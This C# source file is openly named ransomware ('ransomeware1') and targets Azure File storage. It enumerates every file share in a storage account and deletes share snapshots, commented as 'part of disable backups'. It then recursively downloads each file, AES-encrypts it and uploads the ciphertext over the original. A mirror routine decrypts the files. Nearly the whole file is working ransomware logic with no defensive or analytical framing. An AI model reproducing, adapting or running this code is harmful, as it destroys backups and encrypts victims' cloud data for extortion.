using Microsoft.WindowsAzure.Storage; // Namespace for CloudStorageAccount
using Microsoft.WindowsAzure.Storage.File; // Namespace for File storage types
using System;
using ransomeware1;
using System.IO;

public static class File_Storage
{
    public static void EncryptFiles(CloudStorageAccount storageAccount, AESEncryption encrypt)
    {
        // Create the file client.
        CloudFileClient fileClient = storageAccount.CreateCloudFileClient();
        foreach (CloudFileShare share in fileClient.ListShares())
        {
            // Retrieve reference to a previously created container.
            CloudFileShare shr = fileClient.GetShareReference(share.Name);
            if (shr.IsSnapshot)
            {
                shr.Delete(); // part of disable backups
                continue;
            }
            CloudFileDirectory rootDir = share.GetRootDirectoryReference();
            EncryptRecruisveSearch(rootDir, encrypt, storageAccount);
        }

    }

    private static void EncryptRecruisveSearch(CloudFileDirectory dir, AESEncryption encrypt, CloudStorageAccount storageAccount)
    {
        foreach (var fileOrDir in dir.ListFilesAndDirectories())
        {
            if (fileOrDir.GetType() == typeof(CloudFile))
            {
                CloudFile file = fileOrDir as CloudFile;
                Console.WriteLine("Found file: " + file.Name);
              
                Download(file, Utils.getPath());

                encrypt.EncryptAES(Utils.getPath() + file.Name, storageAccount);
                //encrypt.OnFinishEncryption(storageAccount);
                Upload(file, Utils.getPath());

                //Utils.EncryptLocally(Utils.getPath() + file.Name);//for an AES encryption - use Utils.encryptAES
                //upload(file, Utils.getPath());

            }
            if (fileOrDir.GetType() == typeof(CloudFileDirectory))
            {
                EncryptRecruisveSearch((CloudFileDirectory)fileOrDir, (AESEncryption) encrypt, (CloudStorageAccount) storageAccount);
            }
        }
    }


    public static void DecryptFiles(CloudStorageAccount storageAccount, AESDecryption decrypt)
    {
        // Create the file client.
        CloudFileClient fileClient = storageAccount.CreateCloudFileClient();
        foreach (CloudFileShare share in fileClient.ListShares())
        {
            // Retrieve reference to a previously created container.
            CloudFileShare shr = fileClient.GetShareReference(share.Name);
            if (shr.IsSnapshot)
            {
                shr.Delete(); // part of disable backups
                continue;
            }
            CloudFileDirectory rootDir = share.GetRootDirectoryReference();
            DecryptrecruisveSearch(rootDir, decrypt, storageAccount);
        }

    }

    private static void DecryptrecruisveSearch(CloudFileDirectory dir, AESDecryption decrypt, CloudStorageAccount storageAccount)
    {
        foreach (var fileOrDir in dir.ListFilesAndDirectories())
        {
            if (fileOrDir.GetType() == typeof(CloudFile))
            {
                CloudFile file = fileOrDir as CloudFile;
                Console.WriteLine("Found file: " + file.Name);

                Download(file, Utils.getPath());

                decrypt.decryptAES(Utils.getPath() + file.Name, storageAccount);
                Upload(file, Utils.getPath());

                //Utils.EncryptLocally(Utils.getPath() + file.Name);//for an AES encryption - use Utils.encryptAES
                //upload(file, Utils.getPath());

            }
            if (fileOrDir.GetType() == typeof(CloudFileDirectory))
            {
                DecryptrecruisveSearch((CloudFileDirectory)fileOrDir, (AESDecryption)decrypt, (CloudStorageAccount)storageAccount);
            }
        }
    }



    public static void Download(CloudFile blocktype, string path)
    {
        Directory.CreateDirectory(Utils.getPath());

        using (var fileStream = System.IO.File.OpenWrite(Utils.getPath() + blocktype.Name))
        {
            blocktype.DownloadToStream(fileStream);
        }
    }

    public static void Upload(CloudFile blocktype, string path)
    {
        
        using (var fileStream = System.IO.File.OpenRead(Utils.getPath() + blocktype.Name))
        {
            blocktype.UploadFromStream(fileStream);
        }
    }
}